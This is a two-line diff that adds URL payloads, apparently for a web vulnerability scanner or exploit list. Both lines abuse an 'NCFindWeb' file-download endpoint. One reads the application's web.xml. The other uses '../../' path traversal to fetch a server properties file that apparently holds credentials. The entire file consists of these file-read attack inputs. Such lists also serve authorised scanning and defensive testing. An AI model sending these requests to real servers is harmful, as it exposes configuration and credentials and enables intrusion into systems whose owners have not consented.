@@ -1,0 +1,2 @@
+/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml
+/NCFindWeb?service=IPreAlertConfigService&filename=../../ierp/bin/prop.xml
